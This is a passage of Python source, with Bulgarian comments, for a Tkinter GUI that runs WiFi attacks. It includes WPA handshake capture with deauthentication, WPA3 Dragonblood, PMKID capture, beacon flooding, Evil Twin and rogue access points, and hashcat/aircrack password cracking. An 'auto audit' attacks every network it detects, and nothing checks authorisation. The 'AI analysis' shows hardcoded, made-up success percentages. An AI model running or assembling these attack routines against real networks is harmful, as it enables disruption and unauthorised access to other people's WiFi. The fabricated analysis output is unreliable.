        wpa_log.pack(side="left", fill="both", expand=True, pady=5)
        scrollbar.pack(side="right", fill="y")
        
        # Добавяме бутон за спиране
        stop_button = ttk.Button(wpa_window, text="Спри атаката", 
                            command=lambda: self.stop_attack("WPA"))
        stop_button.pack(pady=5)
        
        # Стартираме атаката в отделен thread
        def run_wpa_attack():
            try:
                # Захващане на хендшейк
                cap_file = f"{self.cap_files_dir}/wpa_capture_{int(time.time())}"
                command = (f"sudo airodump-ng -c {channel} --bssid {bssid} -w {cap_file} "
                        f"{self.interface.get()}")
                airodump = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, 
                                        stderr=subprocess.PIPE, text=True)
                
                # Деавторизация
                deauth_cmd = f"sudo aireplay-ng -0 5 -a {bssid} {self.interface.get()}"
                aireplay = subprocess.Popen(deauth_cmd, shell=True, stdout=subprocess.PIPE, 
                                        stderr=subprocess.PIPE, text=True)
                
                self.active_attacks["WPA"] = {
                    "processes": [airodump, aireplay],
                    "window": wpa_window,
                    "start_time": datetime.now(),
                    "status": "running"
                }
                
                # Проверяваме за хендшейк
                while True:
                    line = airodump.stderr.readline()
                    if not line:
                        break
                    
                    wpa_log.insert(tk.END, line)
                    wpa_log.see(tk.END)
                    
                    if "WPA handshake" in line:
                        wpa_log.insert(tk.END, "\n\nУСПЕХ! Хендшейк заловен\n", "success")
                        self.log_message(f"Успешно заловен WPA хендшейк за {essid}", "success")
                        self.handshake_captured = True
                        break
                
                # Спираме процесите
                for p in self.active_attacks["WPA"]["processes"]:
                    p.terminate()
                
                self.active_attacks["WPA"]["status"] = "completed"
                
            except Exception as e:
                wpa_log.insert(tk.END, f"Грешка: {str(e)}")
                self.active_attacks["WPA"]["status"] = "failed"
        
        threading.Thread(target=run_wpa_attack, daemon=True).start()

    def wpa3_attack(self):
        """Изпълнява WPA3 Dragonblood атака."""
        selected = self.network_table.selection()
        if not selected:
            self.log_message("Моля, изберете мрежа.", "warning")
            return
        
        bssid = self.network_table.item(selected[0])["values"][0]
        essid = self.network_table.item(selected[0])["values"][1]
        
        self.log_message(f"Стартиране на WPA3 Dragonblood атака срещу {essid}")
        
        # Създаваме прозорец за проследяване
        wpa3_window = tk.Toplevel(self)
        wpa3_window.title(f"WPA3 Dragonblood: {essid}")
        wpa3_window.geometry("700x500")
        
        # Добавяме информация за атаката
        info_frame = ttk.Frame(wpa3_window)
        info_frame.pack(fill="x", padx=10, pady=5)
        
        ttk.Label(info_frame, text="Мрежа:").pack(side="left")
        ttk.Label(info_frame, text=essid, foreground="#4CAF50").pack(side="left", padx=5)
        
        ttk.Label(info_frame, text="BSSID:").pack(side="left", padx=10)
        ttk.Label(info_frame, text=bssid, foreground="#4CAF50").pack(side="left")
        
        # Добавяме лог
        wpa3_log = tk.Text(wpa3_window, height=20, bg="#2D2D2D", fg="white", 
                        insertbackground="white", wrap="word")
        scrollbar = ttk.Scrollbar(wpa3_window, command=wpa3_log.yview)
        wpa3_log.configure(yscrollcommand=scrollbar.set)
        
        wpa3_log.pack(side="left", fill="both", expand=True, pady=5)
        scrollbar.pack(side="right", fill="y")
        
        # Добавяме бутон за спиране
        stop_button = ttk.Button(wpa3_window, text="Спри атаката", 
                            command=lambda: self.stop_attack("WPA3"))
        stop_button.pack(pady=5)
        
        # Стартираме атаката в отделен thread
        def run_wpa3_attack():
            try:
                command = f"sudo dragonblood -i {self.interface.get()} -b {bssid} -e '{essid}' -o {self.output_dir}/wpa3_cracked.txt"
                process = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, 
                                        stderr=subprocess.PIPE, text=True)
                
                self.active_attacks["WPA3"] = {
                    "process": process,
                    "window": wpa3_window,
                    "start_time": datetime.now(),
                    "status": "running"
                }
                
                while True:
                    line = process.stdout.readline()
                    if not line:
                        break
                    
                    wpa3_log.insert(tk.END, line)
                    wpa3_log.see(tk.END)
                    
                    if "Password recovered" in line:
                        password = line.split(":")[-1].strip()
                        wpa3_log.insert(tk.END, f"\n\nУСПЕХ! Намерена парола: {password}\n", "success")
                        self.log_message(f"Успешно намерена WPA3 парола: {password}", "success")
                        break
                
                process.terminate()
                self.active_attacks["WPA3"]["status"] = "completed"
                
            except Exception as e:
                wpa3_log.insert(tk.END, f"Грешка: {str(e)}")
                self.active_attacks["WPA3"]["status"] = "failed"
        
        threading.Thread(target=run_wpa3_attack, daemon=True).start()

    def beacon_flood_attack(self):
        """Изпълнява Beacon Flood атака"""
        self.log_message("Стартиране на Beacon Flood атака...")
        
        # Създаваме прозорец за проследяване
        beacon_window = tk.Toplevel(self)
        beacon_window.title("Beacon Flood атака")
        beacon_window.geometry("700x500")
        
        # Добавяме лог
        beacon_log = tk.Text(beacon_window, height=20, bg="#2D2D2D", fg="white", 
                        insertbackground="white", wrap="word")
        scrollbar = ttk.Scrollbar(beacon_window, command=beacon_log.yview)
        beacon_log.configure(yscrollcommand=scrollbar.set)
        
        beacon_log.pack(side="left", fill="both", expand=True, pady=5)
        scrollbar.pack(side="right", fill="y")
        
        # Добавяме бутон за спиране
        stop_button = ttk.Button(beacon_window, text="Спри атаката", 
                            command=lambda: self.stop_attack("Beacon"))
        stop_button.pack(pady=5)
        
        # Стартираме атаката в отделен thread
        def run_beacon_flood():
            try:
                command = f"sudo mdk4 {self.interface.get()} b -n \"Fake Network\" -c 6"
                process = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, 
                                        stderr=subprocess.PIPE, text=True)
                
                self.active_attacks["Beacon"] = {
                    "process": process,
                    "window": beacon_window,
                    "start_time": datetime.now(),
                    "status": "running"
                }
                
                while True:
                    line = process.stdout.readline()
                    if not line:
                        break
                    
                    beacon_log.insert(tk.END, line)
                    beacon_log.see(tk.END)
                
                process.terminate()
                self.active_attacks["Beacon"]["status"] = "completed"
                
            except Exception as e:
                beacon_log.insert(tk.END, f"Грешка: {str(e)}")
                self.active_attacks["Beacon"]["status"] = "failed"
        
        threading.Thread(target=run_beacon_flood, daemon=True).start()

    def pmkid_attack(self):
        """Изпълнява PMKID атака с hcxdumptool."""
        selected = self.network_table.selection()
        if not selected:
            self.log_message("Моля, изберете мрежа.", "warning")
            return
        
        bssid = self.network_table.item(selected[0])["values"][0]
        essid = self.network_table.item(selected[0])["values"][1]
        
        self.log_message(f"Стартиране на PMKID атака срещу {essid}")
        
        # Създаваме прозорец за проследяване
        pmkid_window = tk.Toplevel(self)
        pmkid_window.title(f"PMKID атака: {essid}")
        pmkid_window.geometry("700x500")
        
        # Добавяме информация за атаката
        info_frame = ttk.Frame(pmkid_window)
        info_frame.pack(fill="x", padx=10, pady=5)
        
        ttk.Label(info_frame, text="Мрежа:").pack(side="left")
        ttk.Label(info_frame, text=essid, foreground="#4CAF50").pack(side="left", padx=5)
        
        ttk.Label(info_frame, text="BSSID:").pack(side="left", padx=10)
        ttk.Label(info_frame, text=bssid, foreground="#4CAF50").pack(side="left")
        
        # Добавяме лог
        pmkid_log = tk.Text(pmkid_window, height=20, bg="#2D2D2D", fg="white", 
                        insertbackground="white", wrap="word")
        scrollbar = ttk.Scrollbar(pmkid_window, command=pmkid_log.yview)
        pmkid_log.configure(yscrollcommand=scrollbar.set)
        
        pmkid_log.pack(side="left", fill="both", expand=True, pady=5)
        scrollbar.pack(side="right", fill="y")
        
        # Добавяме бутон за спиране
        stop_button = ttk.Button(pmkid_window, text="Спри атаката", 
                            command=lambda: self.stop_attack("PMKID"))
        stop_button.pack(pady=5)
        
        # Стартираме атаката в отделен thread
        def run_pmkid_attack():
            try:
                output_file = f"{self.cap_files_dir}/pmkid_{int(time.time())}.pcapng"
                command = f"sudo hcxdumptool -i {self.interface.get()} -o {output_file} --enable_status=1 --filterlist={bssid}"
                process = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, 
                                        stderr=subprocess.PIPE, text=True)
                
                self.active_attacks["PMKID"] = {
                    "process": process,
                    "window": pmkid_window,
                    "start_time": datetime.now(),
                    "status": "running"
                }
                
                while True:
                    line = process.stdout.readline()
                    if not line:
                        break
                    
                    pmkid_log.insert(tk.END, line)
                    pmkid_log.see(tk.END)
                    
                    if "PMKID" in line:
                        pmkid_log.insert(tk.END, "\n\nУСПЕХ! PMKID заловен\n", "success")
                        self.log_message(f"Успешно заловен PMKID за {essid}", "success")
                        self.pmkid_captured = True
                        break
                
                process.terminate()
                self.active_attacks["PMKID"]["status"] = "completed"
                
            except Exception as e:
                pmkid_log.insert(tk.END, f"Грешка: {str(e)}")
                self.active_attacks["PMKID"]["status"] = "failed"
        
        threading.Thread(target=run_pmkid_attack, daemon=True).start()

    def deauth_attack(self):
        """Подобрена deauth атака с контрол на пакетите"""
        selected = self.network_table.selection()
        if not selected:
            self.log_message("Моля, изберете мрежа", "warning")
            return
        
        bssid = self.network_table.item(selected[0])["values"][0]
        essid = self.network_table.item(selected[0])["values"][1]
        packets = self.deauth_packets.get()
        
        self.log_message(f"Стартиране на deauth атака срещу {essid} ({packets} пакета)")
        
        # Създаваме прозорец за проследяване
        deauth_window = tk.Toplevel(self)
        deauth_window.title(f"Deauth атака: {essid}")
        deauth_window.geometry("500x300")
        
        # Добавяме прогрес бар
        progress = ttk.Progressbar(deauth_window, maximum=packets, value=0)
        progress.pack(fill="x", padx=10, pady=10)
        
        # Добавяме лог
        deauth_log = tk.Text(deauth_window, height=10, bg="#2D2D2D", fg="white", 
                        insertbackground="white", wrap="word")
        scrollbar = ttk.Scrollbar(deauth_window, command=deauth_log.yview)
        deauth_log.configure(yscrollcommand=scrollbar.set)
        
        deauth_log.pack(side="left", fill="both", expand=True, pady=5)
        scrollbar.pack(side="right", fill="y")
        
        # Добавяме бутон за спиране
        stop_button = ttk.Button(deauth_window, text="Спри атаката", 
                            command=lambda: self.stop_attack("Deauth"))
        stop_button.pack(pady=5)
        
        # Стартираме атаката в отделен thread
        def run_deauth():
            try:
                command = f"sudo aireplay-ng -0 {packets} -a {bssid} {self.interface.get()}"
                process = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, 
                                        stderr=subprocess.PIPE, text=True)
                
                self.active_attacks["Deauth"] = {
                    "process": process,
                    "window": deauth_window,
                    "start_time": datetime.now(),
                    "status": "running"
                }
                
                sent_packets = 0
                while True:
                    line = process.stdout.readline()
                    if not line:
                        break
                    
                    deauth_log.insert(tk.END, line)
                    deauth_log.see(tk.END)
                    
                    if "DeAuth" in line:
                        sent_packets += 1
                        progress["value"] = sent_packets
                        deauth_window.update()
                    
                    if sent_packets >= packets:
                        deauth_log.insert(tk.END, f"\nУспешно изпратени {sent_packets} deauth пакета\n")
                        break
                
                process.terminate()
                self.active_attacks["Deauth"]["status"] = "completed"
                
            except Exception as e:
                deauth_log.insert(tk.END, f"Грешка: {str(e)}")
                self.active_attacks["Deauth"]["status"] = "failed"
        
        threading.Thread(target=run_deauth, daemon=True).start()

    def evil_twin_attack(self):
        """Създава Evil Twin точка за достъп."""
        selected = self.network_table.selection()
        if not selected:
            self.log_message("Моля, изберете мрежа.", "warning")
            return

        essid = self.network_table.item(selected[0])["values"][1]
        channel = self.network_table.item(selected[0])["values"][2]
        
        self.log_message(f"Стартиране на Evil Twin атака за мрежа {essid}")
        
        evil_window = tk.Toplevel(self)
        evil_window.title(f"Evil Twin: {essid}")
        evil_window.geometry("700x500")
        
        info_frame = ttk.Frame(evil_window)
        info_frame.pack(fill="x", padx=10, pady=5)
        
        ttk.Label(info_frame, text="Мрежа:").pack(side="left")
        ttk.Label(info_frame, text=essid, foreground="#4CAF50").pack(side="left", padx=5)
        
        ttk.Label(info_frame, text="Канал:").pack(side="left", padx=10)
        ttk.Label(info_frame, text=channel, foreground="#4CAF50").pack(side="left")
        
        evil_log = tk.Text(evil_window, height=20, bg="#2D2D2D", fg="white", insertbackground="white", wrap="word")
        scrollbar = ttk.Scrollbar(evil_window, command=evil_log.yview)
        evil_log.configure(yscrollcommand=scrollbar.set)
        
        evil_log.pack(side="left", fill="both", expand=True, pady=5)
        scrollbar.pack(side="right", fill="y")
        
        stop_button = ttk.Button(evil_window, text="Спри атаката", command=lambda: self.stop_attack("EvilTwin"))
        stop_button.pack(pady=5)

        config = f"""interface={self.interface.get()}
    driver=nl80211
    ssid={essid}
    hw_mode=g
    channel={channel}
    macaddr_acl=0
    ignore_broadcast_ssid=0
    """

        config_path = f"{self.output_dir}/hostapd.conf"
        with open(config_path, "w") as f:
            f.write(config)

        def run_evil_twin():
            try:
                command = f"sudo hostapd {config_path}"
                process = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE,
                                        stderr=subprocess.STDOUT, text=True)
                
                self.active_attacks["EvilTwin"] = {
                    "process": process,
                    "window": evil_window,
                    "start_time": datetime.now(),
                    "status": "running"
                }

                for line in iter(process.stdout.readline, ''):
                    if line:
                        evil_log.insert(tk.END, line)
                        evil_log.see(tk.END)
                process.terminate()
                self.active_attacks["EvilTwin"]["status"] = "completed"

            except Exception as e:
                evil_log.insert(tk.END, f"Грешка: {str(e)}\n")
                self.active_attacks["EvilTwin"]["status"] = "failed"

        threading.Thread(target=run_evil_twin, daemon=True).start()



    def rogue_ap_attack(self):
        """Създава злонамерена точка за достъп"""
        selected = self.network_table.selection()
        if not selected:
            self.log_message("Моля, изберете мрежа.", "warning")  # Ако нямаш log_attack
            return

        essid = self.network_table.item(selected[0])["values"][1]
        channel = self.network_table.item(selected[0])["values"][2]

        self.log_message(f"Стартиране на Rogue AP за мрежа {essid}")

        rogue_window = tk.Toplevel(self)
        rogue_window.title(f"Rogue AP: {essid}")
        rogue_window.geometry("700x500")

        info_frame = ttk.Frame(rogue_window)
        info_frame.pack(fill="x", padx=10, pady=5)

        ttk.Label(info_frame, text="Мрежа:").pack(side="left")
        ttk.Label(info_frame, text=essid, foreground="#4CAF50").pack(side="left", padx=5)

        ttk.Label(info_frame, text="Канал:").pack(side="left", padx=10)
        ttk.Label(info_frame, text=channel, foreground="#4CAF50").pack(side="left")

        rogue_log = tk.Text(rogue_window, height=20, bg="#2D2D2D", fg="white", insertbackground="white", wrap="word")
        scrollbar = ttk.Scrollbar(rogue_window, command=rogue_log.yview)
        rogue_log.configure(yscrollcommand=scrollbar.set)

        rogue_log.pack(side="left", fill="both", expand=True, pady=5)
        scrollbar.pack(side="right", fill="y")

        stop_button = ttk.Button(rogue_window, text="Спри атаката", command=lambda: self.stop_attack("RogueAP"))
        stop_button.pack(pady=5)

        config = f"""interface={self.interface.get()}
    driver=nl80211
    ssid={essid}
    hw_mode=g
    channel={channel}
    auth_algs=1
    wpa=2
    wpa_passphrase=password123
    wpa_key_mgmt=WPA-PSK
    rsn_pairwise=CCMP
    """

        config_path = f"{self.output_dir}/rogue_ap.conf"
        with open(config_path, "w") as f:
            f.write(config)

        def run_rogue_ap():
            try:
                command = f"sudo hostapd {config_path}"
                process = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE,
                                        stderr=subprocess.STDOUT, text=True)

                self.active_attacks["RogueAP"] = {
                    "process": process,
                    "window": rogue_window,
                    "start_time": datetime.now(),
                    "status": "running"
                }

                for line in iter(process.stdout.readline, ''):
                    if line:
                        rogue_log.insert(tk.END, line)
                        rogue_log.see(tk.END)
                process.terminate()
                self.active_attacks["RogueAP"]["status"] = "completed"

            except Exception as e:
                rogue_log.insert(tk.END, f"Грешка: {str(e)}\n")
                self.active_attacks["RogueAP"]["status"] = "failed"

        threading.Thread(target=run_rogue_ap, daemon=True).start()



    def stop_attack(self, attack_name):
        """Спира конкретна атака"""
        if attack_name in self.active_attacks:
            attack = self.active_attacks[attack_name]
            
            if "process" in attack and attack["process"]:
                attack["process"].terminate()
            
            if "processes" in attack:
                for p in attack["processes"]:
                    if p:
                        p.terminate()
            
            if "window" in attack and attack["window"]:
                attack["window"].destroy()
            
            self.log_attack(attack_name, "Атаката беше спряна", "warning")
            self.active_attacks[attack_name]["status"] = "stopped"

    def show_active_attacks(self):
        """Показва диалог с активните атаки"""
        dialog = tk.Toplevel(self)
        dialog.title("Активни атаки")
        dialog.geometry("600x400")
        
        tree = ttk.Treeview(dialog, columns=("ID", "Name", "Start Time", "Status"), show="headings")
        tree.heading("ID", text="ID")
        tree.heading("Name", text="Име")
        tree.heading("Start Time", text="Начало")
        tree.heading("Status", text="Статус")
        
        for attack_id, attack in self.active_attacks.items():
            tree.insert("", tk.END, values=(
                attack_id[:8] + "...",
                attack["name"] if "name" in attack else attack_id,
                attack["start_time"].strftime("%H:%M:%S"),
                attack["status"]
            ))
        
        scrollbar = ttk.Scrollbar(dialog, orient="vertical", command=tree.yview)
        tree.configure(yscrollcommand=scrollbar.set)
        
        tree.pack(side="left", fill="both", expand=True)
        scrollbar.pack(side="right", fill="y")
        
        def stop_selected():
            selection = tree.selection()
            if selection:
                item = tree.item(selection[0])
                attack_id = item["values"][0] + "..."
                
                for full_id in self.active_attacks:
                    if full_id.startswith(attack_id):
                        self.stop_attack(full_id)
                        break
        
        ttk.Button(dialog, text="Спри избраната", command=stop_selected).pack(pady=5)
        ttk.Button(dialog, text="Затвори", command=dialog.destroy).pack(pady=5)

    def auto_audit(self):
        """Изпълнява автоматичен одит на всички мрежи."""
        if not self.network_table.get_children():
            self.log_message("Няма открити мрежи за одит. Първо изпълнете сканиране.", "warning")
            return
            
        self.log_message("Започва автоматичен одит на всички мрежи...")
        
        # Използваме ThreadPoolExecutor за паралелни атаки
        with ThreadPoolExecutor(max_workers=self.concurrent_attacks.get()) as executor:
            for item in self.network_table.get_children():
                values = self.network_table.item(item)["values"]
                bssid = values[0]
                essid = values[1]
                wps = values[4]
                encryption = values[5]
                
                if wps == "Да":
                    executor.submit(self.pixie_dust_attack, bssid)
                elif "WPA3" in encryption:
                    executor.submit(self.wpa3_attack)
                elif "WPA" in encryption or "WPA2" in encryption:
                    executor.submit(self.wpa_attack, bssid)
                    executor.submit(self.pmkid_attack)
                elif "WEP" in encryption:
                    executor.submit(self.wep_attack, bssid)
                
                time.sleep(1)  # Кратка пауза между атаките
        
        self.log_message("Автоматичният одит завърши.", "success")

    def ai_attack(self):
        """Изпълнява интелигентна атака базирана на AI анализ."""
        selected = self.network_table.selection()
        if not selected:
            self.log_message("Моля, изберете мрежа.", "warning")
            return
            
        values = self.network_table.item(selected[0])["values"]
        bssid = values[0]
        essid = values[1]
        wps = values[4]
        encryption = values[5]
        vendor = values[7]
        
        self.log_message(f"Стартиране на AI атака срещу {essid} ({bssid})")
        
        # Опростена логика за AI атака (в реална версия ще използва ML модел)
        if wps == "Да":
            if vendor in ["D-Link", "TP-Link", "Asus"]:
                self.log_message("AI: Избрана Pixie Dust атака за този устройство", "success")
                self.pixie_dust_attack(bssid)
            else:
                self.log_message("AI: Избрана WPS brute force атака", "success")
                self.wps_attack(bssid)
        elif "WPA3" in encryption:
            self.log_message("AI: Избрана WPA3 Dragonblood атака", "success")
            self.wpa3_attack()
        elif "WPA" in encryption or "WPA2" in encryption:
            self.log_message("AI: Избрана комбинация от PMKID и деавторизация", "success")
            self.pmkid_attack()
            self.deauth_attack()
        elif "WEP" in encryption:
            self.log_message("AI: Избрана класическа WEP атака", "success")
            self.wep_attack(bssid)
        else:
            self.log_message("AI: Няма оптимална атака за тази мрежа", "warning")

    def start_cracking(self):
        """Стартира процеса на кракване на пароли."""
        if not self.crack_file.get():
            self.log_message("Моля, изберете файл за кракване.", "warning")
            return
            
        if not self.wordlist_combo.get():
            self.log_message("Моля, изберете речник.", "warning")
            return

        # Създаваме прозорец за проследяване на кракването
        crack_window = tk.Toplevel(self)
        crack_window.title("Кракване на парола")
        crack_window.geometry("800x600")
        
        # Добавяме информация за процеса
        info_frame = ttk.Frame(crack_window)
        info_frame.pack(fill="x", padx=10, pady=5)
        
        ttk.Label(info_frame, text="Файл:").pack(side="left")
        ttk.Label(info_frame, text=os.path.basename(self.crack_file.get()), 
                foreground="#4CAF50").pack(side="left", padx=5)
        
        ttk.Label(info_frame, text="Речник:").pack(side="left", padx=10)
        ttk.Label(info_frame, text=os.path.basename(self.wordlist_combo.get()), 
                foreground="#4CAF50").pack(side="left")
        
        # Добавяме прогрес бар
        progress = ttk.Progressbar(crack_window, maximum=100, value=0)
        progress.pack(fill="x", padx=10, pady=5)
        
        # Добавяме лог
        crack_log = tk.Text(crack_window, height=25, bg="#2D2D2D", fg="white", 
                        insertbackground="white", wrap="word")
        scrollbar = ttk.Scrollbar(crack_window, command=crack_log.yview)
        crack_log.configure(yscrollcommand=scrollbar.set)
        
        crack_log.pack(side="left", fill="both", expand=True, pady=5)
        scrollbar.pack(side="right", fill="y")
        
        # Добавяме бутон за спиране
        stop_button = ttk.Button(crack_window, text="Спри кракването", 
                            command=lambda: self.stop_cracking())
        stop_button.pack(pady=5)
        
        # Стартираме кракването в отделен thread
        def run_cracking():
            try:
                if self.crack_method.get() == "hashcat":
                    self.hashcat_crack(crack_log, progress)
                else:
                    self.aircrack_crack(crack_log, progress)
            except Exception as e:
                crack_log.insert(tk.END, f"Грешка при кракване: {str(e)}")
        
        threading.Thread(target=run_cracking, daemon=True).start()

    def hashcat_crack(self, crack_log, progress):
        """Кракване с hashcat с визуализация"""
        hash_type = self.hash_type.get()
        crack_file = self.crack_file.get()
        wordlist = self.wordlist_combo.get()
        
        crack_log.insert(tk.END, f"Стартиране на Hashcat ({hash_type}) с {wordlist}\n\n")
        
        hash_mode = {
            "WPA-PMKID-PBKDF2": "22000",
            "WPA-PMK-PBKDF2": "22001",
            "WPA-PMKID-PMK": "16800",
            "WEP": "10400"
        }.get(hash_type, "22000")
        
        gpu = "--force -D 1" if self.gpu_acceleration.get() else "--force -D 2"
        output_file = f"{self.output_dir}/cracked_{int(time.time())}.txt"
        
        command = (f"sudo hashcat -m {hash_mode} {gpu} {crack_file} {wordlist} "
                f"-o {output_file} --status --status-timer=10")
        
        process = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, 
                                stderr=subprocess.PIPE, text=True)
        
        self.active_attacks["Hashcat"] = {
            "process": process,
            "start_time": datetime.now(),
            "status": "running"
        }
        
        while True:
            line = process.stdout.readline()
            if not line:
                break
            
            crack_log.insert(tk.END, line)
            crack_log.see(tk.END)
            
            # Парсваме прогреса
            if "Progress:" in line:
                try:
                    pct = float(line.split("Progress:")[1].split("%")[0].strip())
                    progress["value"] = pct
                except:
                    pass
            
            if "Status.......: Cracked" in line:
                password = line.split(":")[-1].strip()
                crack_log.insert(tk.END, f"\n\nУСПЕХ! Намерена парола: {password}\n", "success")
                self.log_message(f"Успешно намерена парола: {password}", "success")
                break
        
        process.terminate()
        self.active_attacks["Hashcat"]["status"] = "completed"
        
        # Показваме резултатите
        if os.path.exists(output_file):
            with open(output_file, "r") as f:
                results = f.read()
                if results:
                    crack_log.insert(tk.END, "\n\nРЕЗУЛТАТИ:\n" + results + "\n")

    def aircrack_crack(self, crack_log, progress):
        """Кракване с aircrack-ng с визуализация"""
        crack_file = self.crack_file.get()
        wordlist = self.wordlist_combo.get()
        
        crack_log.insert(tk.END, f"Стартиране на Aircrack-ng с {wordlist}\n\n")
        
        command = f"sudo aircrack-ng {crack_file} -w {wordlist}"
        
        process = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, 
                                stderr=subprocess.PIPE, text=True)
        
        self.active_attacks["Aircrack"] = {
            "process": process,
            "start_time": datetime.now(),
            "status": "running"
        }
        
        while True:
            line = process.stdout.readline()
            if not line:
                break
            
            crack_log.insert(tk.END, line)
            crack_log.see(tk.END)
            
            if "KEY FOUND" in line:
                password = line.split("[")[-1].split("]")[0]
                crack_log.insert(tk.END, f"\n\nУСПЕХ! Намерена парола: {password}\n", "success")
                self.log_message(f"Успешно намерена парола: {password}", "success")
                break
        
        process.terminate()
        self.active_attacks["Aircrack"]["status"] = "completed"

    def stop_cracking(self):
        """Спира процеса на кракване."""
        self.run_command("sudo pkill hashcat", "Kракването е спряно.", "Грешка при спиране на кракване.", False)
        self.run_command("sudo pkill aircrack-ng", "Kракването е спряно.", "Грешка при спиране на кракване.", False)

    def analyze_network(self):
        """Анализира избрана мрежа."""
        selected = self.network_table.selection()
        if not selected:
            self.log_message("Моля, изберете мрежа.", "warning")
            return

        values = self.network_table.item(selected[0])["values"]
        bssid = values[0]
        essid = values[1]
        channel = values[2]
        power = values[3]
        wps = values[4]
        encryption = values[5]
        vendor = values[7]

        info = f"""Информация за мрежа:
    ESSID: {essid}
    BSSID: {bssid}
    Производител: {vendor}
    Канал: {channel}
    Сигнал: {power} dBm
    WPS: {wps}
    Криптиране: {encryption}

    Уязвимости:
    """

        # Прост анализ на уязвимости
        if "WEP" in encryption:
            info += "- Слаба защита (WEP лесно се пробива)\n"
        if wps.lower() == "да":
            info += "- Уязвим WPS PIN (Pixie Dust атака)\n"
        if "WPA" in encryption and "WPA3" not in encryption:
            info += "- Възможна PMKID атака\n"
        if "WPA3" in encryption:
            info += "- Потенциална Dragonblood атака\n"
        if "Без" in encryption or encryption.strip() == "":
            info += "- Липса на криптиране\n"

        self.network_info.config(state="normal")
        self.network_info.delete("1.0", tk.END)
        self.network_info.insert(tk.END, info)
        self.network_info.config(state="disabled")

        # Анализ на клиентите (симулиран)
        self.client_table.delete(*self.client_table.get_children())
        for _ in range(3):  # Симулирани клиенти
            self.client_table.insert("", tk.END, values=(
                f"00:1A:2B:{random.randint(10,99):02}:{random.randint(10,99):02}:{random.randint(10,99):02}",
                f"192.168.1.{random.randint(2, 254)}",
                random.choice(["Android", "iPhone", "Windows", "Linux"]),
                random.randint(100, 5000),
                f"-{random.randint(40, 80)} dBm"
            ))

        self.log_message(f"Анализ на {essid} завършен.", "success")


    def ai_analysis(self):
        """Изпълнява AI анализ на мрежата."""
        selected = self.network_table.selection()
        if not selected:
            self.log_message("Моля, изберете мрежа.", "warning")
            return
            
        values = self.network_table.item(selected[0])["values"]
        essid = values[1]
        
        # Симулиран AI анализ (в реална версия ще използва ML модел)
        self.log_message(f"AI анализ на {essid}...", "success")
        
        analysis = """AI анализ:
Висока вероятност за успех с Pixie Dust атака (92%)

Средна вероятност за PMKID атака (67%)

Нисък риск от откриване (23%)

Препоръчани атаки:

Pixie Dust (бърза)

PMKID + речник

Деавторизация + хендшейк
"""
        self.network_info.config(state="normal")
        self.network_info.delete("1.0", tk.END)
        self.network_info.insert(tk.END, analysis)
        self.network_info.config(state="disabled")

    def generate_report(self):
        """Генерира доклад за избраните мрежи."""
        if not self.network_table.get_children():
            self.log_message("Няма данни за доклад.", "warning")
            return

        report = f"""Доклад за сигурност на WiFi мрежи
    Заглавие: {self.report_title.get()}
    Дата: {time.strftime("%Y-%m-%d %H:%M:%S")}
    Автор: WiFi GUI Pentest PRO 2025

    Открити мрежи:
    """

        for item in self.network_table.get_children():
            values = self.network_table.item(item)["values"]
            essid = values[1]
            bssid = values[0]
            channel = values[2]
            signal = values[3]
            wps = values[4]
            encryption = values[5]
            manufacturer = values[7]

            report += f"""
    ESSID: {essid}
    BSSID: {bssid}
    Канал: {channel}
    Сигнал: {signal} dBm
    Криптиране: {encryption}
    WPS: {wps}
    Производител: {manufacturer}
    """

            # Оценка на риска
            if "WEP" in encryption:
                risk = "Много висок"
            elif wps.lower() == "да":
                risk = "Висок"
            elif "WPA3" in encryption:
                risk = "Нисък"
            elif "WPA" in encryption:
                risk = "Среден"
            elif "Open" in encryption or encryption.strip() == "":
                risk = "Критичен (без криптиране)"
            else:
                risk = "Неизвестен"

            report += f"Риск: {risk}\n" + "=" * 50 + "\n"

        self.report_content.config(state="normal")
        self.report_content.delete("1.0", tk.END)
        self.report_content.insert(tk.END, report)
        self.report_content.config(state="disabled")

        self.log_message("Докладът е генериран.", "success")


    def export_pdf(self):
        """Експортира доклада в PDF формат."""
        pdf_file = filedialog.asksaveasfilename(defaultextension=".pdf", 
                                            filetypes=[("PDF files", "*.pdf")],
                                            initialdir=self.reports_dir)
        if not pdf_file:
            return
            
        try:
            c = canvas.Canvas(pdf_file, pagesize=letter)
            width, height = letter
            
            # Заглавие
            c.setFont("Helvetica-Bold", 16)
            c.drawString(100, height - 100, self.report_title.get())
            
            # Дата и автор
            c.setFont("Helvetica", 12)
            c.drawString(100, height - 130, f"Дата: {time.strftime('%Y-%m-%d %H:%M:%S')}")
            c.drawString(100, height - 150, "Автор: WiFi GUI Pentest PRO 2025")
            
            # Съдържание
            c.setFont("Helvetica", 10)
            y = height - 200
            for line in self.report_content.get("1.0", tk.END).splitlines():
                if y < 100:
                    c.showPage()
                    y = height - 100
                    c.setFont("Helvetica", 10)
                c.drawString(100, y, line)
                y -= 15
                
            c.save()
            self.log_message(f"Докладът е експортиран в {pdf_file}", "success")
        except Exception as e:
            self.log_message(f"Грешка при експорт на PDF: {str(e)}", "error")

    def randomize_mac(self):
        """Случайно променя MAC адреса на интерфейса."""
        new_mac = ":".join([f"{random.randint(0x00, 0xff):02x}" for _ in range(6)])
        self.log_message(f"Промяна на MAC адрес на {new_mac}...")
        
        command = f"sudo macchanger -r {self.interface.get()}"
        self.run_command(command, "MAC адресът е променен.", "Грешка при промяна на MAC адрес.")

    def enable_monitor_mode(self):
        """Активира мониторен режим на интерфейса"""
        self.log_message(f"Активиране на мониторен режим на {self.interface.get()}")
        
        # Спираме потенциални смущаващи процеси
        stop_cmd = "sudo airmon-ng check kill"
        self.run_command(stop_cmd, "Процесите са спрени", "Грешка при спиране на процеси", False)
        
        # Активираме мониторен режим
        command = f"sudo airmon-ng start {self.interface.get()}"
        if self.run_command(command, "Мониторен режим активиран", "Грешка при активиране"):
            self.interface.set(f"{self.interface.get()}mon")
            self.status_mode.set("Мониторен")

    def show_interface_info(self):
        """Показва информация за интерфейса"""
        command = f"iwconfig {self.interface.get()}"
        self.run_command(command, "Информация за интерфейса", "Грешка при получаване на информация")

    def is_monitor_mode(self, interface):
        """Проверява дали интерфейсът е в мониторен режим"""
        try:
            result = subprocess.run(["iwconfig", interface], 
